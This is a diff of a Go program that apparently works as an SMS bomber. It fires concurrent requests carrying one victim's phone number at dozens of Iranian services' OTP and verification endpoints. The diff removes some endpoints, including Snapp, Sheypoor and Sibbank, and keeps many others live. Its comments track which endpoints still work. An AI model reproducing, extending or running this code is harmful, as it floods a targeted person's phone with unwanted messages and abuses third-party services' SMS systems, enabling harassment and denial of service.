@@ -111,12 +111,6 @@ func main() {
 		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
 			"userKey": phone,
 		}, ch)   // just check
-		go sms("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", map[string]interface{}{
-			"cellphone": phone,
-		}, ch)   // just check
-		go sms("https://api.snapp.ir/api/v1/sms/link", map[string]interface{}{
-			"phone": phone,
-		}, ch)   // just check
 		go sms("https://bck.behtarino.com/api/v1/users/jwt_phone_verification/", map[string]interface{}{
 			"phone": phone,
 		}, ch)  // edit :4/22/2025
@@ -162,9 +156,6 @@ func main() {
 		go sms("https://ws.alibaba.ir/api/v3/account/mobile/otp", map[string]interface{}{
 			"phoneNumber": phone,
 		}, ch)   // edit :4/22/2025
-		go sms("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0", map[string]interface{}{
-		 	"cellphone": phone,
-                }, ch)  // edit :4/22/2025
 		go sms("https://api.bitbarg.com/api/v1/authentication/registerOrLogin", map[string]interface{}{
 			"phone": phone,
 		}, ch)  // delete site: no Access
@@ -189,16 +180,10 @@ func main() {
 		go sms("https://www.namava.ir/api/v1.0/accounts/registrations/by-otp/request", map[string]interface{}{
 			"UserName": phone,
 		}, ch)  // edit :4/22/2025
-		go sms("https://www.sheypoor.com/api/v10.0.0/auth/send", map[string]interface{}{
-			"username": phone,
-		}, ch)  // edit :4/22/2025
 		go sms("https://ssr.anargift.com/api/v1/auth", map[string]interface{}{
 			"mobile": phone,
 		}, ch)  // edit :4/22/2025
 		go sms("https://ssr.anargift.com/api/v1/auth/send_code", map[string]interface{}{
-			"mobile": phone,
-		}, ch)  // edit :4/22/2025
-		go sms("https://api.nobat.ir/patient/login/phone", map[string]interface{}{
 			"mobile": phone,
 		}, ch)  // edit :4/22/2025
 		go sms("https://www.buskool.com/send_verification_code", map[string]interface{}{
@@ -342,14 +327,8 @@ func main() {
 		go sms("https://irwco.ir/register", map[string]interface{}{
 			"mobile": phone,
 		}, ch)
-		go sms("https://api.sibbank.ir/v1/auth/login", map[string]interface{}{
-			"phone_number": phone,
-		}, ch)
 		go sms("https://api.snapp.ir/api/v1/sms/link", map[string]interface{}{
 			"phone": phone,
-		}, ch)
-		go sms("https://www.miare.ir/api/otp/driver/request/", map[string]interface{}{
-			"phone_number": phone,
 		}, ch)
 		go sms("https://api.arshiyan.com/send_code", map[string]interface{}{
 			"'country_code':'98','phone_number'": phone,
